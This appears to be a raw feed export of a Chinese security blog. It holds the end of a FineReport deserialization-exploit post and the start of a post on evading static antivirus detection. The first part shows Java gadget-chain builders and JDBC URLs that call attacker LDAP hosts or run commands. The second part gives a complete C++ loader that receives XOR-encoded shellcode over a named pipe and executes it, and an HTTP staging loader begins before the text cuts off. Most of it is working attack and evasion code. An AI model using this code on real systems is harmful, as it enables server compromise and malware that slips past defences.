class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">return</span> hashtable;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="hashmap触发tostring"><a href="#hashmap触发tostring" class="headerlink" title="hashmap触发tostring"></a>hashmap触发tostring</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">maskmapToString</span><span class="hljs-params">( Object o1,  Object o2)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap1</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">tHashMap2</span> <span class="hljs-operator">=</span> (Map) createWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>    tHashMap1.put(o1,<span class="hljs-literal">null</span>);<br>    tHashMap2.put(o2,<span class="hljs-literal">null</span>);<br>    setFieldValue(tHashMap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    setFieldValue(tHashMap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> node.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, node);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node1</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap1, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> constructor.newInstance(<span class="hljs-number">0</span>, tHashMap2, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> node.getDeclaredField(<span class="hljs-string">&quot;key&quot;</span>);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> Field.class.getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>    modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>    modifiers.setInt(key, key.getModifiers() &amp; ~Modifier.FINAL);<br>    key.setAccessible(<span class="hljs-literal">true</span>);<br>    key.set(node1, tHashMap1);<br>    key.set(node2, tHashMap2);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-literal">true</span>);<br>    size.set(hashMap, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> HashMap.class.getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>);<br>    table.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">arr</span> <span class="hljs-operator">=</span> Array.newInstance(node, <span class="hljs-number">2</span>);<br>    Array.set(arr, <span class="hljs-number">0</span>, node1);<br>    Array.set(arr, <span class="hljs-number">1</span>, node2);<br>    table.set(hashMap, arr);<br>    <span class="hljs-keyword">return</span> hashMap;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x06-一些坑点"><a href="#0x06-一些坑点" class="headerlink" title="0x06 一些坑点"></a>0x06 一些坑点</h2><p>​默认包里面一些数据库是没有环境的，需要自己下载，如h2，ibm，postsql等，默认是hsqldb，好在hsqldb可以直接调用java的public static 方法，和官方包不同，需要自己去找方法调用。默认jdk是191，也就是jndi得用高版本jdk去绕过。一般用两种方式，一种利用利用本地Class作为Reference Factory，一种基利用LDAP返回序列化数据，触发本地Gadget。这里我是利用第二种直接本地gadget出触发</p><p>​<img src="image-20240528143712133.png" alt="image-20240528143712133"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">java.util.HashMap.readObject/java.util.Hashtable.readObject<br>java.util.AbstractMap.equals<br>javax.swing.UIDefaults$TextAndMnemonicHashMap.get<br>   com.fr.json.JSONArray.toString<br>   com.fr.third.fasterxml.jackson.databind.ObjectMapper.writeValueAsString<br>   com.fr.third.alibaba.druid.pool.xa.DruidXADataSource.getXAConnection<br></code></pre></td></tr></table></figure><h2 id="0x07-一些jdbc"><a href="#0x07-一些jdbc" class="headerlink" title="0x07 一些jdbc"></a>0x07 一些jdbc</h2><h3 id="ibm"><a href="#ibm" class="headerlink" title="ibm"></a>ibm</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">      druidDataSource.setUrl(<span class="hljs-string">&quot;jdbc:db2://127.0.0.1:5001/BLUDB:clientRerouteServerListJNDIName=ldap://10.0.0.67:1389/remoteExploit8;&quot;</span>);<br>druidDataSource.setDriverClassName(<span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">druidDataSource.setUrl(<span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS &#x27;//javascript\n&quot;</span> +<br>        <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open .\&quot;)&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">druidDataSource.setUrl(<span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=CommonsCollections6&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="hsqldb"><a href="#hsqldb" class="headerlink" title="hsqldb"></a>hsqldb</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">druidDataSource.setValidationQuery(<span class="hljs-string">&quot;call \&quot;javax.naming.InitialContext.doLookup\&quot;(&#x27;ldap://10.211.55.2:4444/123&#x27;);&quot;</span>);<br>druidDataSource.setDriverClassName(<span class="hljs-string">&quot;com.fr.third.org.hsqldb.jdbcDriver&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>javax.swing.UIDefaults$TextAndMnemonicHashMap，com.fr.third.alibaba.druid.pool.xa.DruidXADataSource</p><p>com.fr.third.alibaba.druid.pool.xa.DataSource</p><p>com.fr.json.JSONArray 加入反序列黑名单，</p><p><a href="https://help.fanruan.com/finereport/doc-view-4833.html">https://help.fanruan.com/finereport/doc-view-4833.html</a></p><p>官方通告，升级至2024-05及之后版本。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>​此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>静态恶意代码逃逸(三)</title>
    <link href="/2024/06/08/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%B8%89/"/>
    <url>/2024/06/08/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h2 id="分离"><a href="#分离" class="headerlink" title="分离"></a>分离</h2><h3 id="0x01-管道接收shellcode"><a href="#0x01-管道接收shellcode" class="headerlink" title="0x01 管道接收shellcode"></a>0x01 管道接收shellcode</h3><p>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</p><p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFF_SIZE 1024</span><br> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-string">&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;</span><br><span class="hljs-string">&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;</span><br><span class="hljs-string">&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;</span><br><span class="hljs-string">&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;</span><br><span class="hljs-string">&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;</span><br><span class="hljs-string">&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;</span><br><span class="hljs-string">&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;</span><br><span class="hljs-string">&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;</span><br><span class="hljs-string">&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;</span><br><span class="hljs-string">&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;</span><br><span class="hljs-string">&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;</span><br><span class="hljs-string">&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;</span><br><span class="hljs-string">&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;</span>;<br> <span class="hljs-type">const</span> TCHAR* ptsPipeName = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;\\\\.\\pipe\\BadCodeTest&quot;</span>);<br><span class="hljs-function">BOOL <span class="hljs-title">RecvShellcode</span><span class="hljs-params">(VOID)</span> </span>&#123;<br>    HANDLE hPipeClient;<br>    DWORD dwWritten;<br>    DWORD dwShellcodeSize = <span class="hljs-built_in">sizeof</span>(buf);  <span class="hljs-comment">// 获取buf的大小作为shellcode的大小</span><br>    <span class="hljs-comment">// 等待管道可用</span><br>    <span class="hljs-built_in">WaitNamedPipe</span>(ptsPipeName, NMPWAIT_WAIT_FOREVER);  <span class="hljs-comment">// 等待命名管道可用</span><br>    <span class="hljs-comment">// 连接管道</span><br>    hPipeClient = <span class="hljs-built_in">CreateFile</span>(<br>        ptsPipeName,<br>        GENERIC_WRITE,<br>        FILE_SHARE_READ,<br>        <span class="hljs-literal">NULL</span>,<br>        OPEN_EXISTING,<br>        FILE_ATTRIBUTE_NORMAL,<br>        <span class="hljs-literal">NULL</span><br>    );  <span class="hljs-comment">// 创建文件句柄以连接到命名管道</span><br><br>    <span class="hljs-keyword">if</span> (hPipeClient == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;  <span class="hljs-comment">// 无法打开管道，返回失败</span><br>    &#125;<br><br>    <span class="hljs-built_in">WriteFile</span>(hPipeClient, buf, dwShellcodeSize, &amp;dwWritten, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 将shellcode写入管道</span><br>    <span class="hljs-keyword">if</span> (dwWritten == dwShellcodeSize) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hPipeClient);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>, dwShellcodeSize);<br>        <span class="hljs-keyword">return</span> TRUE;  <span class="hljs-comment">// 写入成功，返回成功</span><br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hPipeClient);<br>    <span class="hljs-keyword">return</span> FALSE;  <span class="hljs-comment">// 写入失败，返回失败</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, TCHAR* argv[])</span> </span>&#123;<br><br>    HANDLE hPipe;<br>    DWORD dwError;<br>    CHAR szBuffer[BUFF_SIZE];<br>    DWORD dwLen;<br>    PCHAR pszShellcode = <span class="hljs-literal">NULL</span>;<br>    DWORD dwOldProtect;  <span class="hljs-comment">// 用于存储内存页属性</span><br>    HANDLE hThread;<br>    DWORD dwThreadId;<br>    <span class="hljs-comment">// 创建命名管道</span><br>    hPipe = <span class="hljs-built_in">CreateNamedPipe</span>(<br>        ptsPipeName,<br>        PIPE_ACCESS_INBOUND,<br>        PIPE_TYPE_BYTE | PIPE_WAIT,<br>        PIPE_UNLIMITED_INSTANCES,<br>        BUFF_SIZE,<br>        BUFF_SIZE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span><br>    );<br><br>    <span class="hljs-keyword">if</span> (hPipe == INVALID_HANDLE_VALUE) &#123;<br>        dwError = <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-]Create Pipe Error : %d \n&quot;</span>, dwError);<br>        <span class="hljs-keyword">return</span> dwError;  <span class="hljs-comment">// 创建命名管道失败，返回错误码</span><br>    &#125;<br><br>    <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvShellcode, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 创建线程等待接收shellcode</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ConnectNamedPipe</span>(hPipe, <span class="hljs-literal">NULL</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Client Connected...\n&quot;</span>);<br>        <span class="hljs-built_in">ReadFile</span>(hPipe, szBuffer, BUFF_SIZE, &amp;dwLen, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 从管道中读取数据</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Get DATA Length : %d \n&quot;</span>, dwLen);<br>        <span class="hljs-comment">// 申请内存页</span><br>        pszShellcode = (PCHAR)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwLen, MEM_COMMIT, PAGE_READWRITE);  <span class="hljs-comment">// 在内存中分配空间</span><br>        <span class="hljs-comment">// 拷贝内存</span><br>        <span class="hljs-built_in">CopyMemory</span>(pszShellcode, szBuffer, dwLen);  <span class="hljs-comment">// 将数据复制到分配的内存中</span><br><br>        <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwLen; i++) &#123;<br>            <span class="hljs-comment">//Sleep(50);</span><br>            _InterlockedXor8(pszShellcode + i, <span class="hljs-number">10</span>);  <span class="hljs-comment">// 对内存中的数据进行异或操作</span><br>        &#125;<br><br>        <span class="hljs-comment">// 更改内存页属性为可执行</span><br>        <span class="hljs-built_in">VirtualProtect</span>(pszShellcode, dwLen, PAGE_EXECUTE, &amp;dwOldProtect);<br>        <span class="hljs-comment">// 执行Shellcode</span><br>        hThread = <span class="hljs-built_in">CreateThread</span>(<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-literal">NULL</span>,<br>            (LPTHREAD_START_ROUTINE)pszShellcode,<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-literal">NULL</span>,<br>            &amp;dwThreadId<br>        );<br><br>        <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);  <span class="hljs-comment">// 等待线程执行完毕</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>没看，贴的代码，感觉没啥调用。</p><h3 id="0x02-http-分离"><a href="#0x02-http-分离" class="headerlink" title="0x02 http 分离"></a>0x02 http 分离</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winhttp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;winhttp.lib&quot;</span>)</span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">char</span>* <span class="hljs-title">WinGet</span><span class="hljs-params">(<span class="hljs-type">char</span>* ip, <span class="hljs-type">int</span> port, <span class="hljs-type">char</span>* url)</span></span><br><span class="hljs-function"></span>&#123;<br><br>HINTERNET hSession = <span class="hljs-literal">NULL</span>;<br>HINTERNET hConnect = <span class="hljs-literal">NULL</span>;<br>HINTERNET hRequest = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">//************ 将char转换为wchar_t *****************/</span><br><span class="hljs-type">int</span> ipSize;<br><span class="hljs-type">wchar_t</span>* ip_wchar;<br><span class="hljs-comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span><br>ipSize = <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, ip, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//iSize =wcslen(pwsUnicode)+1=6</span><br>ip_wchar = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(ipSize * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>)); <span class="hljs-comment">//不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))</span><br><span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, ip, <span class="hljs-number">-1</span>, ip_wchar, ipSize);<br><br><span class="hljs-type">int</span> urlSize;<br><span class="hljs-type">wchar_t</span>* url_wchar;<br><span class="hljs-comment">//返回接受字符串所需缓冲区的大小，已经包含字符结尾符&#x27;\0&#x27;</span><br>urlSize = <span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, url, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">//iSize =wcslen(pwsUnicode)+1=6</span><br>url_wchar = (<span class="hljs-type">wchar_t</span>*)<span class="hljs-built_in">malloc</span>(urlSize * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">wchar_t</span>)); <span class="hljs-comment">//不需要 pwszUnicode = (wchar_t *)malloc((iSize+1)*sizeof(wchar_t))</span><br><span class="hljs-built_in">MultiByteToWideChar</span>(CP_ACP, <span class="hljs-number">0</span>, url, <span class="hljs-number">-1</span>, url_wchar, urlSize);<br><span class="hljs-comment">//************ ********************************* *****************/</span><br><br><br><span class="hljs-comment">//port = 80; //默认端口</span><br><br><span class="hljs-comment">//1. 初始化一个WinHTTP-session句柄，参数1为此句柄的名称</span><br>hSession = <span class="hljs-built_in">WinHttpOpen</span>(<span class="hljs-string">L&quot;WinHTTP Example/1.0&quot;</span>,<br>WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,<br>WINHTTP_NO_PROXY_NAME,<br>WINHTTP_NO_PROXY_BYPASS, <span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (hSession == <span class="hljs-literal">NULL</span>) &#123;<br>cout 